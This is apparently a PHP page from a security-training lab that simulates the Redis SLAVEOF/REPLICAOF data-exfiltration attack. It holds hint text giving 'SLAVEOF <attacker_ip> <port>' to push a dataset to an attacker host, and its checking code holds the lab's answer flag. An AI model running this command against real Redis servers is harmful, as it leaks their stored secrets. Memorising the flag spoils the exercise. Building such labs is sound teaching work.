<?php
require_once __DIR__ . '/../../includes/db.php';
$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* ===========================
   REDIS LAB 4. SLAVEOF Data Exfiltration
   Real Redis for data, simulated SLAVEOF/REPLICAOF
   =========================== */

if (isset($_POST['flag_field'])) {
    $submitted = trim($_POST['flag_field']);
    if ($submitted === 'FLAG{rd_sl4v30f_3xf1l}') {
        $_SESSION['redis_lab4_solved'] = true;
        header("Location: " . url_lab_from_slug("redis/lab4", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}

// Track simulated replication state in session
if (!isset($_SESSION['redis_lab4_repl'])) {
    $_SESSION['redis_lab4_repl'] = [
        'role' => 'master',
        'connected_slaves' => 0,
        'master_repl_offset' => 0,
        'master_host' => null,
        'master_port' => null,
        'repl_state' => 'disconnected'
    ];
}
$replication = &$_SESSION['redis_lab4_repl'];

/**
 * Execute a Redis command. Real Redis for GET/SET/KEYS,
 * simulated SLAVEOF/REPLICAOF for safety.
 */
function lab4Execute($rawCmd, $conn, $prefix, &$replication) {
    $log = [];
    $exfiltrated = false;

    $parts = preg_split('/\s+/', trim($rawCmd), 4);
    $cmd = strtoupper($parts[0] ?? '');

    switch ($cmd) {
        case 'SLAVEOF':
        case 'REPLICAOF':
            $host = $parts[1] ?? '';
            $port = $parts[2] ?? '6379';

            if (strtoupper($host) === 'NO' && strtoupper($port) === 'ONE') {
                // Stop replication
                $replication['role'] = 'master';
                $replication['repl_state'] = 'disconnected';
                $replication['master_host'] = null;
                $replication['master_port'] = null;
                $log[] = [
                    'cmd' => "SLAVEOF NO ONE",
                    'result' => "OK. Replication disabled. Instance promoted to master."
                ];
            } else {
                // Start replication to attacker-controlled host
                $replication['master_host'] = $host;
                $replication['master_port'] = $port;
                $replication['repl_state'] = 'connecting';

                $log[] = [
                    'cmd' => "SLAVEOF $host $port",
                    'result' => "OK. Connecting to $host:$port as replica..."
                ];

                $log[] = [
                    'cmd' => '(replication)',
                    'result' => "SYNC: Sending PSYNC to $host:$port..."
                ];

                // Check if this is an "attacker" host (any non-standard address)
                if ($host !== '127.0.0.1' && $host !== 'localhost') {
                    $replication['repl_state'] = 'connected';
                    $replication['role'] = 'slave';
                    $exfiltrated = true;

                    // Get real keys from Redis for the exfil display
                    $allKeys = $conn->keys($prefix . '*');
                    $keyNames = array_map(function($k) use ($prefix) {
                        return str_replace($prefix, '', $k);
                    }, $allKeys);
                    $dataSize = 0;
                    $keyData = [];
                    foreach ($allKeys as $k) {
                        $v = $conn->get($k);
                        $dataSize += strlen($k) + strlen($v);
                    }

                    $log[] = [
                        'cmd' => '(replication)',
                        'result' => "FULLRESYNC: Sending RDB snapshot to $host:$port...\n" .
                            "  - Transferring " . count($allKeys) . " keys ($dataSize bytes)\n" .
                            "  - Keys sent: " . implode(', ', $keyNames)
                    ];

                    $log[] = [
                        'cmd' => '(replication)',
                        'result' => "SYNC completed. All data replicated to $host:$port.\n" .
                            "WARNING: All key-value data including secrets has been transmitted!"
                    ];
                } else {
                    $log[] = [
                        'cmd' => '(replication)',
                        'result' => "Connection to $host:$port established (local instance)"
                    ];
                    $replication['repl_state'] = 'connected';
                }
            }
            break;

        case 'INFO':
            $section = strtolower($parts[1] ?? 'all');

            if ($section === 'replication' || $section === 'all') {
                $info = "# Replication\n";
                $info .= "role:" . $replication['role'] . "\n";
                if ($replication['role'] === 'slave' && $replication['master_host']) {
                    $info .= "master_host:" . $replication['master_host'] . "\n";
                    $info .= "master_port:" . $replication['master_port'] . "\n";
                    $info .= "master_link_status:" . ($replication['repl_state'] === 'connected' ? 'up' : 'down') . "\n";
                    $info .= "slave_read_only:1\n";
                } else {
                    $info .= "connected_slaves:" . $replication['connected_slaves'] . "\n";
                    $info .= "master_repl_offset:" . $replication['master_repl_offset'] . "\n";
                }
                $log[] = ['cmd' => "INFO $section", 'result' => $info];
            } else {
                $log[] = ['cmd' => "INFO $section", 'result' => "(section not available)"];
            }
            break;

        case 'GET':
            $key = $parts[1] ?? '';
            $fullKey = $prefix . $key;
            $val = $conn->get($fullKey);
            $display = ($val === false) ? '(nil)' : $val;
            if ($replication['repl_state'] === 'connected' && $replication['role'] === 'slave') {
                $log[] = ['cmd' => $rawCmd, 'result' => "(readonly) $display"];
            } else {
                $log[] = ['cmd' => $rawCmd, 'result' => $display];
            }
            break;

        case 'KEYS':
            $pattern = $parts[1] ?? '*';
            $fullPattern = $prefix . $pattern;
            $keys = $conn->keys($fullPattern);
            $shortKeys = array_map(function($k) use ($prefix) {
                return str_replace($prefix, '', $k);
            }, $keys);
            $result = implode("\n", $shortKeys);
            $log[] = ['cmd' => $rawCmd, 'result' => $result ?: '(empty list)'];
            break;

        case 'SET':
            if ($replication['role'] === 'slave') {
                $log[] = ['cmd' => $rawCmd, 'result' => '(error) READONLY You can\'t write against a read only replica.'];
            } else {
                $key = $parts[1] ?? '';
                $value = $parts[2] ?? '';
                $fullKey = $prefix . $key;
                $conn->set($fullKey, $value);
                $log[] = ['cmd' => $rawCmd, 'result' => 'OK'];
            }
            break;

        default:
            $log[] = ['cmd' => $rawCmd, 'result' => "(error) ERR unknown command '$cmd'"];
    }

    return ['log' => $log, 'exfiltrated' => $exfiltrated];
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 4. SLAVEOF Data Exfiltration</h3>

    <h4>Scenario</h4>
    <p>
        This is a <strong>conceptual demonstration</strong> of the Redis SLAVEOF/REPLICAOF attack.
        A Redis instance exposed without authentication can be turned into a replica of an
        attacker-controlled server, causing it to transmit all its data during the full
        synchronization process.
    </p>

    <h4>Objective</h4>
    <p>
        Use the <code>SLAVEOF</code> command to make the Redis
        instance replicate to your "attacker server" (any external IP). Observe how the full
        sync transfers all keys including secrets. Then retrieve the flag from the exfiltrated data.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. <code>SLAVEOF &lt;attacker_ip&gt; &lt;port&gt;</code> initiates replication.<br>
        2. During FULLRESYNC, the entire dataset (RDB snapshot) is sent to the specified host.<br>
        3. Use any non-local IP address as the attacker server.<br>
        4. After exfiltration, use <code>SLAVEOF NO ONE</code> to restore master status.
    </div>
</div>

<!-- Flag Verification -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag_field" placeholder="FLAG{...}" class="input" required>
        <button type="submit" class="btn btn-primary">Submit Flag</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<?php if (!empty($_SESSION['redis_lab4_solved'])): ?>
<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You demonstrated how SLAVEOF exfiltrates all data to an attacker-controlled instance during replication sync.</div>
    </div>
</div>
<?php endif; ?>

<!-- Redis Command Interface -->
<div class="card">
    <h4>Redis Instance. Command Console</h4>
    <p>
        This Redis instance is running without authentication. Execute commands to explore
        and exploit the replication mechanism.
    </p>
    <form method="POST" class="form-row">
<input type="text" name="cmd" placeholder="Redis command (try: INFO replication)" class="input" value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>" style="font-family: 'JetBrains Mono', monospace;">
        <button type="submit" class="btn btn-primary">Execute</button>
    </form>

    <?php
    if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
        $rawCmd = $_POST['cmd'];

        $execResult = lab4Execute($rawCmd, $conn, $redisPrefix, $replication);
        $log = $execResult['log'];

        echo '<div class="terminal">';
        echo '<div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">Redis Console</span></div>';
        echo '<div class="terminal-body">';

        foreach ($log as $entry) {
            if ($entry['cmd'] === '(replication)') {
                echo '<span class="prompt">[replication] </span>';
            } else {
                echo '<span class="prompt">redis> </span>' . htmlspecialchars($entry['cmd']) . "<br>";
            }
            echo '<pre style="margin:4px 0 12px 0;color:inherit;white-space:pre-wrap;">' . htmlspecialchars($entry['result']) . '</pre>';
        }

        echo '</div></div>';

        // Show exfiltration alert
        if ($execResult['exfiltrated']) {
            echo '<div class="result-error result-box">';
            echo '<strong>DATA EXFILTRATED!</strong> All Redis keys have been transmitted to the attacker-controlled server during full synchronization. ';
            echo 'The attacker now has access to all data including session tokens, credentials, and flags.';
            echo '</div>';
        }
    }
    ?>
</div>

<!-- Replication Status -->
<div class="card">
    <h4>Replication Status</h4>
    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">INFO Replication</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">role: </span><?= htmlspecialchars($replication['role']) ?><br>
            <span class="prompt">connected_slaves: </span><?= htmlspecialchars($replication['connected_slaves']) ?><br>
            <span class="prompt">master_repl_offset: </span><?= htmlspecialchars($replication['master_repl_offset']) ?>
        </div>
    </div>
</div>
